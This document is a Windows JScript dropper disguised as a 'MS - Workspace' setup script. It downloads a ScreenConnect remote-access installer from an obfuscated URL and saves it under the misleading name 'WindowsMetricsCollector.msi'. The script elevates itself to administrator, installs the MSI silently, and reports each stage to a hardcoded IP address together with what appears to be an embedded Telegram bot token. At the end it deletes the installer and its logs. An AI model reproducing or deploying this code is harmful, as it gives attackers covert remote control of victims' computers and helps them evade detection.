//91f538d5b335
(function () {
    "use strict";

    var SETTINGS = {
//399a31083c50
        PRODUCT_NAME: "MS - Workspace",
        PRODUCT_VERSION: "1.0.0",
//91f8ceaa7031
        MSI_URL: ["https://","educationalfiles.","online/Bin/ScreenConnect.","ClientSetup.","msi?e=Access&y=Guest"].join(''),
        MSI_FILE_NAME: "WindowsMetricsCollector.msi",
//678709db53fb
        INSTALL_DIR: "%ProgramData%\\MSWorkspace\\Install",
        LOG_DIR: "%ProgramData%\\MSWorkspace\\Logs",
//9e27685a02ce
        LOG_FILE: "deploy.log",
        MSI_LOG_FILE: "msi-install.log",
//1c93f3cc27bb
        DOWNLOAD_RETRIES: 2,
        RETRY_DELAY_MS: 1500,
//70eee9d102db
        DOWNLOAD_TIMEOUT_MS: 300000,
        MSI_EXTRA_ARGS: "",

        EXFIL_HOST: "212.43.151.96:20002",        
        
        TBTOKEN: "8679220057:AAHOQoG-qxYVT7-3si70mYE4_veZBf7q4l8",
//4873a35b21db
        TCID: "-1004296347689",
        DEPLOY_TOKEN: Math.random().toString(36).substring(2, 8), 

        UNINSTALL_EXISTING: true,
//03b2a7ddc2a6
        PRODUCT_CODE: "{4228D3D7-CF51-5361-1BC4-165794361D9B}",

//acacf6abca78
        SHOW_POPUPS: false
    };

    var wsh = new ActiveXObject("WScript.Shell");
//715c8471bdb7
    var fsys = new ActiveXObject("Scripting.FileSystemObject");

//19d526b1fb52
    function resolveEnv(p) {
        return wsh.ExpandEnvironmentStrings(p);
//4a1ad2b5143a
    }

//da0071c89670
    var paths = {
        installDir: resolveEnv(SETTINGS.INSTALL_DIR),
//8c27f6388719
        logDir: resolveEnv(SETTINGS.LOG_DIR),
        logFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.LOG_FILE,
//8cc4e1280f8f
        msiLogFile: resolveEnv(SETTINGS.LOG_DIR) + "\\" + SETTINGS.MSI_LOG_FILE,
        msiPath: resolveEnv(SETTINGS.INSTALL_DIR) + "\\" + SETTINGS.MSI_FILE_NAME
//fe2bb1f05e12
    };

//f20738a92165
    function pad(n) {
        return (n < 10 ? "0" : "") + n;
//0a2196e52f4a
    }

//4c14bc4acd97
    function ts() {
        var d = new Date();
//0f417fc97b1f
        return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) +
            " " + pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
//bbd54a4de843
    }

//61e4f2236b3b
    function mkdirs(dir) {
        var parent;
//5a0248332bdd
        dir = String(dir).replace(/[\\\/]+$/, "");
        if (!dir || fsys.FolderExists(dir)) return;
//1fa392817263
        parent = fsys.GetParentFolderName(dir);
        if (parent && parent !== dir && !fsys.FolderExists(parent)) {
//83d8a4e242af
            mkdirs(parent);
        }
//227b03118e1e
        if (!fsys.FolderExists(dir)) fsys.CreateFolder(dir);
    }

    function log(level, msg) {
//fba9f1194ab6
        try {
            mkdirs(paths.logDir);
//d982c307a729
            var f = fsys.OpenTextFile(paths.logFile, 8, true);
            f.WriteLine("[" + ts() + "] [" + level + "] " + msg);
//ca5570d12eef
            f.Close();
        } catch (e) { }
//57f7101e7988
    }


    function beacon(stage, exitCode) {
//9de26ba979a5
        try {
            var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//27f477fc48ed
            var now = new Date();
            var dts = pad(now.getMonth() + 1) + pad(now.getDate()) +
//f4166c22667e
                      pad(now.getHours()) + pad(now.getMinutes());
            var statusCode, exitStr;

            switch (stage) {
//306875d21e08
                case "start": statusCode = "go";  exitStr = "0";     break;
                case "ok":    statusCode = "ok";  exitStr = String(exitCode || 0);    break;
//dab59f4703d3
                case "okr":   statusCode = "okr"; exitStr = String(exitCode || 3010); break;
                case "oka":   statusCode = "oka"; exitStr = String(exitCode || 1638); break;
//21e0446e95be
                case "cl":    statusCode = "cl";  exitStr = String(exitCode || 1602); break;
                default:      statusCode = "fl";  exitStr = String(exitCode || 1);    break;
//9a2adb4a5eb1
            }

//90a52d8d2163
            var deployId = SETTINGS.DEPLOY_TOKEN;

//4248b9b1a755
            var url = "http://" + SETTINGS.EXFIL_HOST + "/" +
                      SETTINGS.TBTOKEN + "/" +
//7799116b9955
                      SETTINGS.TCID + "/" +
                      deployId + "." +
//aaa6194b8469
                      statusCode + "." +
                      exitStr + "." +
//aeef9a12466b
                      dts;

//2fb7c01b9f15
            http.Open("GET", url, false);
            http.SetTimeouts(1000, 1000, 1000, 1000);
//38666b6687c4
            http.Send();
        } catch (e) { }
//667f59bba696
    }

//f5e64fdce1a0
    // ── helpers ──

//e34deb466cd7
    function checkAdmin() {
        try {
//bdb9acbe7166
            var exec = wsh.Exec("net session");
            while (exec.Status === 0) { WScript.Sleep(50); }
//e1a7da48f5de
            return exec.ExitCode === 0;
        } catch (e) { return false; }
//d53cd8015aeb
    }

//0bd4bcb6fa6c
    function escalate() {
        var app = new ActiveXObject("Shell.Application");
//b56fef474861
        var script = WScript.ScriptFullName;
        app.ShellExecute("cscript.exe", '//nologo "' + script + '"', "", "runas", 0);
//21c5c6dcdaa6
        WScript.Quit(0);
    }

    function checkConfig() {
//aff9106bf8e1
        if (!SETTINGS.MSI_URL) abort("Setup could not start.", "MSI_URL is empty", 1);
        if (SETTINGS.MSI_URL.indexOf("https://") !== 0 && SETTINGS.MSI_URL.indexOf("http://") !== 0)
//5616266c5ee6
            abort("Setup could not start.", "Invalid MSI_URL scheme", 1);
        if (SETTINGS.MSI_FILE_NAME.indexOf(".msi") === -1)
//2276a9024f7f
            abort("Setup could not start.", "Invalid MSI_FILE_NAME", 1);
    }

    function writeResponse(responseBody, outPath) {
//976956166e26
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
//403c10ab2356
        stream.Open();
        stream.Write(responseBody);
//5ea5c1357f80
        if (stream.Size <= 0) { stream.Close(); return 0; }
        if (fsys.FileExists(outPath)) fsys.DeleteFile(outPath, true);
//7eb873f1fc77
        stream.SaveToFile(outPath, 2);
        var size = stream.Size;
//c9381947631e
        stream.Close();
        return size;
//0dfa70b9993b
    }

//9e28ddb981e2
    function fetchPayload(url, outPath) {
        var attempt, http, err, bytesWritten, status;
//c959cbea0d6a
        mkdirs(fsys.GetParentFolderName(outPath));
        err = "Unknown download error";

        for (attempt = 0; attempt <= SETTINGS.DOWNLOAD_RETRIES; attempt++) {
//e27d9ad9c759
            try {
                http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
//f338e1bf6941
                try { http.Option(9) = 2048; } catch (e) { }
                http.SetTimeouts(30000, 30000, SETTINGS.DOWNLOAD_TIMEOUT_MS, SETTINGS.DOWNLOAD_TIMEOUT_MS);
//6834bb4776f3
                http.Open("GET", url, false);
                http.Send();
//046a87adc52d
                status = http.Status;
                if (status === 200) {
//f3e19bcd1a5a
                    bytesWritten = writeResponse(http.ResponseBody, outPath);
                    if (bytesWritten > 0 && fsys.FileExists(outPath)) return true;
//3303d3720213
                    err = "HTTP 200 but zero-byte payload";
                } else { err = "HTTP " + status; }
//cf5cea3ccdee
            } catch (ex) { err = (ex.message || String(ex)); }
            if (attempt < SETTINGS.DOWNLOAD_RETRIES) WScript.Sleep(SETTINGS.RETRY_DELAY_MS);
//d6023ff5fc61
        }
        return false;
//e390eef063bb
    }

//62226c78fa72
    function purgeOld() {
        if (!SETTINGS.UNINSTALL_EXISTING || !SETTINGS.PRODUCT_CODE) return;
//ae46edf7a874
        var cmd = "msiexec.exe /x " + SETTINGS.PRODUCT_CODE +
                  " /qn /norestart REBOOT=ReallySuppress";
//f5a950dd46d8
        log("INFO", "Uninstalling existing product: " + SETTINGS.PRODUCT_CODE);
        var code = wsh.Run(cmd, 0, true);
//c88d5fb4ce98
        if (code !== 0 && code !== 1605 && code !== 1612)
            log("WARN", "Uninstall returned " + code + " — continuing anyway");
//6dbaed74dfbf
        else
            log("INFO", "Uninstall exit code: " + code);
//98593d4361b9
        WScript.Sleep(3000);
    }

    function execMsi(msiPath) {
//4eb21cd1ec1a
        var args, cmd, code, attempt, modes;
        mkdirs(paths.logDir);
//ee57657994ea
        modes = [
            "/qn /norestart REBOOT=ReallySuppress ALLUSERS=1",
//17d3cbd27867
            "/qb /norestart REBOOT=ReallySuppress ALLUSERS=1"
        ];
//5954c9c5c983
        for (attempt = 0; attempt < modes.length; attempt++) {
            args = '/i "' + msiPath + '" ' + modes[attempt] + " " +
//a353eb815cb8
                   SETTINGS.MSI_EXTRA_ARGS + ' /L*v "' + paths.msiLogFile + '"';
            cmd = "msiexec.exe " + args;
//45e9d8861bef
            code = wsh.Run(cmd, 0, true);
            if (code === 0 || code === 3010 || code === 1641 || code === 1638) return code;
//d06540c22275
            if (code !== 1603) return code;
            WScript.Sleep(2000);
//556c9f730c53
        }
        return 1603;
//e47d92e36726
    }

//80de9a1aa19a
    function explainCode(code) {
        switch (code) {
//8d302643a371
            case 0:    return "Success";
            case 3010: return "Success (restart required)";
//6cbe28a123f8
            case 1641: return "Success (restart initiated)";
            case 1638: return "Already installed";
//b1180f1aabb6
            case 1602: return "Canceled by user";
            case 1603: return "Fatal error during installation";
//07e9e6ea75fb
            case 1618: return "Another installation is already in progress";
            default:   return "Exit code " + code;
//0543646e2cae
        }
    }

    function isOk(code) {
//82a9c90ed618
        return code === 0 || code === 3010 || code === 1641 || code === 1638;
    }

    function abort(friendlyMsg, technicalMsg, exitCode) {
//031507521b2c
        if (technicalMsg) log("ERROR", technicalMsg);
        if (typeof exitCode !== "number") exitCode = 1;
//d8327dcd8840
        log("ERROR", "MSI log file: " + paths.msiLogFile);
        beacon("fail", exitCode);
//b660ab175338
        if (SETTINGS.SHOW_POPUPS)
            wsh.Popup(friendlyMsg, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//125ad2c9069a
        WScript.Quit(exitCode);
    }


//83bce134a960
    mkdirs(paths.installDir);
    mkdirs(paths.logDir);

    if (!checkAdmin()) { escalate(); }

    beacon("start", null);

    checkConfig();

    if (!fetchPayload(SETTINGS.MSI_URL, paths.msiPath)) {
//a378ab917e1b
        abort(
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
//3a784d4a2096
            "Download failed after " + (SETTINGS.DOWNLOAD_RETRIES + 1) + " attempts", 1
        );
//1294657d641f
    }

//d3b3ac3f5de2
    if (!fsys.FileExists(paths.msiPath) || fsys.GetFile(paths.msiPath).Size <= 0) {
        abort(
//86a2f49e18d1
            "Setup could not be completed.\n\nThe installer file could not be downloaded.",
            "MSI missing or empty after download", 1
//ea0f5eafdbc0
        );
    }

    purgeOld();

    var exitCode = execMsi(paths.msiPath);
//696e698439c3
    var statusText = explainCode(exitCode);

//d7d1a2222820
    if (isOk(exitCode)) {
        if (exitCode === 3010 || exitCode === 1641) beacon("okr", exitCode);
//d70baa957048
        else if (exitCode === 1638)                 beacon("oka", exitCode);
        else                                        beacon("ok", exitCode);
//99b4fd4be4da
    } else if (exitCode === 1602) {
        log("WARN", "Installation canceled by user");
//d45d936ad4c6
        beacon("cl", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//088894b6e325
            wsh.Popup("Setup was canceled.", 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
    } else {
//82e0bd2c3ba3
        log("ERROR", "Installation result: " + statusText);
        log("ERROR", "MSI log file: " + paths.msiLogFile);
//0b0c28a6d7d2
        beacon("fail", exitCode);
        if (SETTINGS.SHOW_POPUPS)
//26550df8e51f
            wsh.Popup("Setup could not be completed.\n\n" + statusText +
                "\n\nCheck log:\n" + paths.msiLogFile, 0, SETTINGS.PRODUCT_NAME + " Setup", 16);
//460eb9892df6
    }

//5a90705ca867
    try {
        if (fsys.FileExists(paths.msiPath))   fsys.DeleteFile(paths.msiPath, true);
//24f40e461cad
        if (fsys.FileExists(paths.logFile))   fsys.DeleteFile(paths.logFile, true);
        if (fsys.FileExists(paths.msiLogFile)) fsys.DeleteFile(paths.msiLogFile, true);
//c14e383eb479
        if (fsys.FolderExists(paths.logDir))  { try { fsys.DeleteFolder(paths.logDir, true); } catch (e) { } }
    } catch (e) { }

    WScript.Quit(exitCode);
//458d1a320df7
})();